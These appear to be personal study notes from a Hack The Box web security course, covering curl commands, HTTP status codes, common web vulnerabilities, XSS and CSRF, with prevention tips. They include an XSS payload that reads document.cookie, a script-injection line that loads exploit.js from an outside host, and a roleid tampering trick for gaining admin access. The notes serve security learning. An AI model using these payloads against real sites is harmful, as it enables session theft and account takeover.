---
title: "Web Security - HTB Course"
date: 2025-01-07
categories: [infosec, web-security]
tags: [web-security, curl, http, xss, csrf, sql-injection, htb]
toc: true
toc_label: "Contents"
toc_icon: "shield-alt"
excerpt: "Reference notes - HTTP, curl commands, web vulnerabilities."
---

## cURL Commands

```bash
curl <url> -v                           # verbose
curl <url> -vvv                         # max verbosity
curl -I <url>                           # HEAD request (headers only)
curl -i <url>                           # headers + body
curl <url> -A 'Mozilla/5.0'             # change User-Agent
```

**SSH config:** `/etc/ssh/sshd_config`

## Authentication

```bash
# HTTP Basic Auth
curl -u admin:admin http://<SERVER_IP>:<PORT>/
curl http://admin:admin@<SERVER_IP>:<PORT>/

# Manual header (base64-encoded admin:admin)
curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://<SERVER_IP>:<PORT>/
```

## POST Requests

```bash
# Basic POST
curl -X POST -d 'username=admin&password=admin' http://<serverip>:<PORT>

# Flags:
# -X POST : HTTP method
# -d : data payload
# -L : follow redirects
# -s : silence output
# -I : headers only

# Session cookies
curl -X POST -d 'username=admin&password=admin' http://<server-ip>:<port> -i  # get session
curl -b 'PHPSESSID=<session-id>' http://<serverid>:<port>                      # use session

# JSON requests
curl -X POST -d '{"search":"london"}' -b 'PHPSESSID=<id>' -H 'Content-Type: application/json' http://<serverip:port>/search.php
```

**DevTools trick:** Network tab → right-click → Copy as Fetch

## HTTP Status Codes

| **Class** | **Description** |
| --------- | --------------- |
| **1xx**   | informational   |
| **2xx**   | success         |
| **3xx**   | redirect        |
| **4xx**   | client error    |
| **5xx**   | server error    |

**Common:**
- **200** - OK
- **302** - Redirect
- **400** - Bad Request
- **403** - Forbidden
- **404** - Not Found
- **500** - Internal Server Error

**Format JSON:** `curl ... | jq`

## Web Vulnerabilities

### SQL Injection
Manipulate DB queries via malicious SQL in input fields.
- Extract DB contents
- Bypass auth
- Execute admin ops
- Run OS commands

Path: SQLi → AD usernames → password spray

### File Inclusion
User input specifies which file to include/execute.
- Read source code
- Access config files
- Include remote files
- RCE

### Unrestricted File Upload
No validation on uploaded files.
- Upload web shell
- Upload executables
- Replace configs
- Parser exploits

### IDOR (Insecure Direct Object Referencing)
Exposed internal IDs without access checks.

```
https://example.com/user/701/edit-profile → /user/702/edit-profile
```

### Broken Access Control
Users can perform unauthorized actions.

Example: Registration form with `roleid=3` parameter → change to `roleid=1` → admin account.

## Web App Architecture

**Components:**
1. **Client** - trust boundary
2. **Server** - webserver, app logic, database
3. **Services** - 3rd party APIs, microservices
4. **Functions** - serverless

**Layers:**
- **Presentation** - UI, prevent XSS, output encoding
- **Application** - business logic, most vulns here
- **Data** - storage, SQLi, data exposure, access control

## URL Encoding

| Char | Encoding | Char | Encoding |
|------|----------|------|----------|
| space| %20      | %    | %25      |
| !    | %21      | &    | %26      |
| "    | %22      | '    | %27      |
| #    | %23      | (    | %28      |
| $    | %24      | )    | %29      |

[Full reference](https://www.w3schools.com/tags/ref_urlencode.ASP)

## XSS (Cross-Site Scripting)

Inject malicious scripts into web pages.

**Types:**
- **Reflected** - input immediately displayed (search results, errors)
- **Stored** - input saved in DB, affects all users (comments, profiles)
- **DOM** - client-side JS writes to DOM without sanitization

**Payload example:**
```javascript
#"><img src=/ onerror=alert(document.cookie)>
```
- `#">` - closes existing tags
- `<img src=/` - invalid image
- `onerror=alert(document.cookie)>` - executes JS on fail

HttpOnly cookies prevent JS access to session cookies.

## CSRF (Cross-Site Request Forgery)

Tricks authenticated users into performing unintended actions.

**How:**
1. User authenticated
2. Attacker crafts malicious request
3. Browser includes auth cookies
4. Server processes as legitimate

**Payload example:**
```html
"><script src=//www.example.com/exploit.js></script>
```

Can change password, transfer money, modify settings.

**Prevention:**
- Anti-CSRF tokens
- SameSite cookie attributes
- Re-auth for sensitive actions
- Check Origin/Referer headers

[OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
